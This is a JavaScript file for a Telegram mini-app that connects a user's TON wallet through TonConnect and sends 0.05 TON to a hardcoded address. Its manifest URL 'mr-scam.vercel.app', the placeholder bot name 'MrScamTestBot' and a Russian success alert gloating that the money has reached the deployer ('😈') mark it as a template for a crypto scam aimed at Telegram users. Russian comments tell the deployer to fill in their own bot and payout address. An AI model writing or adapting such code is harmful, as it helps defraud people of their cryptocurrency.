const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

const usernameEl = document.getElementById('username');
let username = 'Guest';
if (tg.initDataUnsafe?.user) {
  const user = tg.initDataUnsafe.user;
  username = user.username ? `@${user.username}` : user.first_name || 'User';
}
usernameEl.textContent = username;

// TonConnect UI — это даст точно такую модалку, как на скрине
const tonConnectUI = new TonConnectUI({
  manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
  buttonRootId: 'connect-container',  // ← Кнопка вставится сюда автоматически
  actionsConfiguration: {
    twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на ссылку твоего бота, например https://t.me/MrScamTestBot
  }
});

let connectedWallet = null;
tonConnectUI.onStatusChange(wallet => {
  if (wallet) {
    connectedWallet = wallet.account.address;
    document.getElementById('wallet-status').textContent = `подключён: \( {connectedWallet.slice(0,6)}... \){connectedWallet.slice(-4)}`;
  } else {
    connectedWallet = null;
    document.getElementById('wallet-status').textContent = 'не подключён';
  }
});

// Оплата 0.05 TON на твой адрес
document.getElementById('payment-btn').onclick = async () => {
  if (!connectedWallet) return alert('⚠️ Сначала подключите кошелёк!');

  const transaction = {
    validUntil: Math.floor(Date.now() / 1000) + 600,
    messages: [{
      address: 'UQBpBH_apAYKPChl7V1wfEeZ1JovWFIr2VXfzTVUVQfDXHrZ',
      amount: '50000000' // 0.05 TON
    }]
  };

  try {
    await tonConnectUI.sendTransaction(transaction);
    alert('✅ 0.05 TON внесено! Деньги пришли тебе 😈');
  } catch (e) {
    alert('❌ Ошибка или отменено');
  }
};
